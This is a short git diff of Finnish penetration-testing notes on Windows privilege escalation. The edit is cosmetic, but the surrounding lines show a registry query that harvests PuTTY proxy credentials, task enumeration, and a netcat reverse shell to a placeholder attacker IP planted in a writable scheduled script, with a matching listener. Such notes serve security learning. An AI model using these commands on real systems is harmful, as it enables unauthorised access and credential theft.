@@ -45,6 +45,7 @@ PuTTY:n tallentamat Proxy-tunnukset:
 reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 ```
 **Ajastetut tehtävät**
+
 Listaa ajastetut tehtävät:
 ```cmd
 schtasks
@@ -62,6 +63,6 @@ Jos esim. \USERS -käyttäjillä kirjoitusoikeudet, voidaan tehdä reverse shell
 echo c:\polku\netcatiin\nc64.exe -e cmd.exe *Hyökkääjän IP* 9999 > C:\polku\scrriptiin\scripti.bat
 ```
 Netcat -kuuntelumoodiin omalle koneelle porttiin 9999:
-```unix
+```cmd
 nc -ncvlp 9999
 ```
